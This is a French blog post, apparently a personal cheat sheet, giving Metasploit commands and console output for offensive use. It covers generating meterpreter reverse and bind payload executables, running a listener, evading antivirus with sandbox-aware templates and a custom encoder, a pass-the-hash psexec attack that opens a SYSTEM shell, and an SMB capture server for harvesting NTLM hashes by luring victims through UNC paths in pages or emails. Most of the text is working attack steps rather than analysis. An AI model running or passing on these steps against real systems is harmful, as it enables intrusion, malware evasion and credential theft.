---
layout: post
title: "Metasploit"
description: "Commandes utiles de l'outil Metasploit"
category: Tools
tags: [Tools, Shell, Linux, Hack]
---
{% include JB/setup %}

##Genération de payload exécutables##

###Manuel###

~~~~~~~
# msfvenom -h
Usage: /opt/framework/msf3/msfvenom [options]

Options:
    -p, --payload    [payload]       Payload to use. Specify a '-' or stdin to use custom payloads
    -l, --list       [module_type]   List a module type example: payloads, encoders, nops, all
    -n, --nopsled    [length]        Prepend a nopsled of [length] size on to the payload
    -f, --format     [format]        Format to output results in: raw, ruby, rb, perl, pl, bash, sh, c, js_be, js_le, java, dll, exe, exe-small, elf, macho, vba, vbs, loop-vbs, asp, war
    -e, --encoder    [encoder]       The encoder to use
    -a, --arch       [architecture]  The architecture to use
        --platform   [platform]      The platform of the payload
    -s, --space      [length]        The maximum size of the resulting payload
    -b, --bad-chars  [list]          The list of characters to avoid example: '\x00\xff'
    -i, --iterations [count]         The number of times to encode the payload
    -c, --add-code   [path]          Specify an additional win32 shellcode file to include
    -x, --template   [path]          Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -h, --help                       Show this message
~~~~~~~

###Exemple###

####Lister les options d'un payload####

~~~~~~~
# msfvenom -p windows/meterpreter/reverse_tcp -o
~~~~~~~

####Créer un payload meterpreter pour windows####

~~~~~~~
# msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 > windobReverseMeterpreter5555.exe
~~~~~~~

####Créer un payload meterpreter pour Linux####

~~~~~~~
# msfvenom -p linux/x86/meterpreter/bind_tcp -f elf LPORT=5555 > linuxMeterpreter5555.bin
~~~~~~~

###Alternative###

~~~~~~~
# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X > met-reverse.exe
~~~~~~~


##Lancement de handler##

~~~~~~~
# msfcli multi/handler LPORT=5555 E
~~~~~~~


##Exploitation depuis msfconsole##

Cette méthode evite de charger deux fois le gros de metasploit.

~~~~~~~
use payload/windows/meterpreter/bind_tcp
set LPORT 8888
show options
generate -t exe -f /root/meterpreter6666.exe
back

use exploit/multi/handler
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST 192.168.0.1
set LPORT 8888
exploit
~~~~~~~

## Contournement des antivirus##

Certains virus utilisent des sandboxes pour lancer les exécutables et vérifier leur dangerosité. (Mal)heureusement, ces sandboxes implémentent rarement les communication réseaux, pour des raisons de sécurités.

Il est donc possible de cacher un payload malveillant en vérifiant la possibilité d'effectuer une connexion réseau. En utilisant le template [ci-joint]({{ ASSET_PATH }}/ressources/Tools/metasploit/meterpreterTemplate1.zip) et l'encoder metasploit [ci-joint]({{ ASSET_PATH }}/ressources/Tools/metasploit/xorbyte.rb) à placer dans modules/encoders/x86/xorbyte.rb.

Pour une backdoor plus permanente, en bind tcp, il est possible d'utiliser le template [ci-joint]({{ ASSET_PATH }}/ressources/Tools/metasploit/meterpreterTemplate2.zip).


## PassTheHash en utilisant metasploit ##

Le module _exploit/windows/smb/psexec_ permet de réaliser de s'authentifier sur une machine Windows en PassTheHash et d'obtenir un shell meterpreter :

~~~~~~~
# msfconsole -q
msf > use exploit/windows/smb/psexec
msf  exploit(psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf  exploit(psexec) > set LHOST 10.42.42.42
LHOST => 10.42.42.42
msf  exploit(psexec) > set SMBPass aad3b435ffffffffffffffffff1404ee:253b4ffffffffffffffffffff6f31185
SMBPass => aad3b435bfffffffffffffffffff04ee:253b4a94bcfffffffffffffaf6f31185
msf  exploit(psexec) > set SMBUser Administrateur
SMBUser => Administrateur
msf  exploit(psexec) > set RHOST 10.42.42.238
RHOST => 10.42.42.238
msf  exploit(psexec) > exploit -z

[*] Started reverse handler on 10.42.42.42:4444
[*] Connecting to the server...
[*] Authenticating to 10.42.42.238:445|WORKGROUP as user 'Administrateur'...
[*] Uploading payload...
[*] Created \wHREjtTN.exe...
[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.42.42.238[\svcctl] ...
[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.42.42.238[\svcctl] ...
[*] Obtaining a service manager handle...
[*] Creating a new service (MLkScPls - "MVZHuslgOhCiQVBanShOvcO")...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \wHREjtTN.exe...
[*] Sending stage (752128 bytes) to 10.42.42.238
[*] Meterpreter session 1 opened (10.42.42.42:4444 -> 10.42.42.238:58782) at 2012-04-27 10:42:16 +0200
[*] Session 1 created in the background.
msf  exploit(psexec) > sessions

Active sessions
===============

  Id  Type                   Information                  Connection
  --  ----                   -----------                  ----------
  1   meterpreter x86/win32  AUTORITE NT\SYSTEM @ C61112  10.42.42.42:4444 -> 10.42.42.238:58782 (10.42.42.238)

msf  exploit(psexec) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
~~~~~~~



## Récupération de challenges NTLM ##

### Exploitation de mauvaise configuration de client samba ###

Le module _auxiliary/server/capture/smb_ permet de simuler un serveur samba avec un niveau de sécurité faible afin de capturer les hashs des utilisateurs :

~~~~~~~
# msfconsole -q
msf  > use auxiliary/server/capture/smb
msf  auxiliary(smb) > set CAINPWFILE /tmp/smb_cain.txt
CAINPWFILE => /tmp/smb_cain.txt
msf  auxiliary(smb) > set JOHNPWFILE /tmp/smb_john.txt
JOHNPWFILE => /tmp/smb_john.txt
msf  auxiliary(smb) > info

       Name: Authentication Capture: SMB
     Module: auxiliary/server/capture/smb
    Version: 14976
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm <hdm@metasploit.com>

Basic options:
  Name        Current Setting    Required  Description
  ----        ---------------    --------  -----------
  CAINPWFILE  /tmp/smb_cain.txt  no        The local filename to store the hashes in Cain&Abel format
  CHALLENGE   1122334455667788   yes       The 8 byte challenge
  JOHNPWFILE  /tmp/smb_john.txt  no        The prefix to the local filename to store the hashes in JOHN format
  SRVHOST     0.0.0.0            yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT     445                yes       The local port to listen on.
  SSL         false              no        Negotiate SSL for incoming connections
  SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
  SSLVersion  SSL3               no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)

Description:
  This module provides a SMB service that can be used to capture the
  challenge-response password hashes of SMB client systems. Responses
  sent by this service have by default the configurable challenge
  string (\x11\x22\x33\x44\x55\x66\x77\x88), allowing for easy
  cracking using Cain & Abel, L0phtcrack or John the ripper (with
  jumbo patch). To exploit this, the target system must try to
  authenticate to this module. The easiest way to force a SMB
  authentication attempt is by embedding a UNC path (\\SERVER\SHARE)
  into a web page or email message. When the victim views the web page
  or email, their system will automatically connect to the server
  specified in the UNC share (the IP address of the system running
  this module) and attempt to authenticate.

msf  auxiliary(smb) > run
[*] Auxiliary module execution completed

[*] Server started.
msf  auxiliary(smb) > [*] Empty hash captured from 10.67.4.224:1854 captured, ignoring ...
[*] 2012-05-03 17:56:45 +0200
NTLMv1 Response Captured from 10.67.4.224:1854
USER:My DOMAIN:FR OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
LMHASH:7a0ffffffffffffffffffffffffffffffffffffffffbc673
NTHASH:d4acfffffffffffffffffffffffffffffffffffffff88736

[*] Empty hash captured from 10.42.42.24:1864 captured, ignoring ...
[*] Empty hash captured from 10.42.42.24:1871 captured, ignoring ...
[*] Empty hash captured from 10.42.42.24:1873 captured, ignoring ...
[*] Empty hash captured from 10.42.42.24:1880 captured, ignoring ...
[*] Empty hash captured from 10.42.42.24:1887 captured, ignoring ...

msf  auxiliary(smb) >

testuser::FR:175c0e51065adfffffffffffffffffffffffffff78d268aa:175c0e51065adffffffffffffffffffffffff44078d268aa:1122334455667788
~~~~~~~

